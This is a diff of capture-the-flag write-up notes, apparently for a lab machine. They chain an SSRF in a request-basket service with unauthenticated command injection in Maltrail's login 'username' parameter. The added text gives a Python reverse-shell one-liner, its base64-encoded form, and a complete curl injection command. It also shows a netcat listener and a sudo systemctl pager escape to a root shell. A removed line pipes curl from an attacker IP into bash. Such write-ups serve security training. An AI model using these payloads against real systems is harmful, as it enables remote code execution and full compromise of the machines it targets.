@@ -336,21 +336,16 @@ Root: Your tipical PE, pretty straight forward.Foothold: This basket is powered 
 
 ### Exploitation
 - [exploit for the CVE](https://notes.sjtu.edu.cn/s/MUUhEymt7)
-1. vector: payload for BURP:
-```
-{
-    "forward_url": "http://127.0.0.1:80",
-    "proxy_response": false,
-    "insecure_tls": false,
-    "expand_path": true,
-    "capacity": 250
-}
-```
-![](https://hackmd.io/_uploads/Bk3vS1ntn.png)
+1. vector: payload 
+    - create basket "test"
+    - after creation -> open basket -> settings (upper bar):
+        - Forward URL: http://127.0.0.1:80/
+        - Proxy Response: YES
+        - Expand Forward path: YES
+    - basket is reconfigured
+    - go to the basket: http://10.10.11.224:55555/test
+        - new Maltrail page
 
-- we obtained the token 
-    ![](https://hackmd.io/_uploads/BJGcrynK2.png)
-- By exploiting the SSRF vulnerability, we will be able to create a specific route that we can access. Once inside this route, we can proceed to exploit the SSRF vulnerability.
 2. SSRF vulnerability:
     - [maltrail](https://github.com/stamparm/maltrail)
         - When accessing the route generated through the exploitation of the SSRF vulnerability, we encountered the Maltrail application. Maltrail is a malicious traffic detection system that utilizes public lists of suspicious and malicious traces, along with static traces obtained from reports of multiple antivirus providers. 
@@ -359,21 +354,32 @@ Root: Your tipical PE, pretty straight forward.Foothold: This basket is powered 
                 - [CVE detail #2](https://github.com/stamparm/maltrail/blob/master/core/httpd.py#L399)
         - During the analysis, an unauthenticated command execution vulnerability has been identified in the `subprocess.check_output` function located in the file `mailtrail/core/http.py` of Maltrail. The presence of a command injection in the `params.get("username")` parameter is the cause of this vulnerability.
     
-        ![](https://hackmd.io/_uploads/SJSFD1nK3.png)
-        - By exploiting the SSRF vulnerability and sending the required parameters in a POST request to the login route, we will be able to execute commands on the system and eventually escalate privileges.
-    
-            ![](https://hackmd.io/_uploads/B1B4Hm3K3.png)
-            - username=;`curl 10.10.14.17:1234 | bash`'
-            - Reverse shell connection established
-                
-
-                    
-    
-
+    - building exploit:
+        - [base64 python](https://medium.com/pentesternepal/owasp-ktm-0x03-ctf-writeup-e467634a9661)
+        - Reverse Shell: https://www.revshells.com/
+            - Reverse -> Python3 #2
+                - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+                    - ifconfig -> obtain local IP address to get RS
+                    - to Base64
+                        - final body of payload: cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjIiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
+        - FINAL PAYLOAD:
+            - note: you have to change your IP and PORT, encode it to base64 to work...   
+            - curl <BASKET URL> -d 'username=;'echo <BASE64> |base64 -d|bash''
 ### User flag
-    
+- nc -nlvp 4444         
+- curl 'http://10.10.11.224:55555/test/login' -d 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjIiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==|base64 -d|bash`'
+- we have RS -> cd /home/puma , cat user.txt
 ### Root flag
-
+- python3 -c 'import pty;pty.spawn("/bin/bash");'
+- sudo -l
+    - User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+    - try to run it
+- lets try to run it under SUDO
+    - sudo /usr/bin/systemctl status trail.service
+        - !sh
+            - we have root shell :)
+- cd /root
 ## Pilgrimage
 ### Reco
 1. sudo nmap <IP>
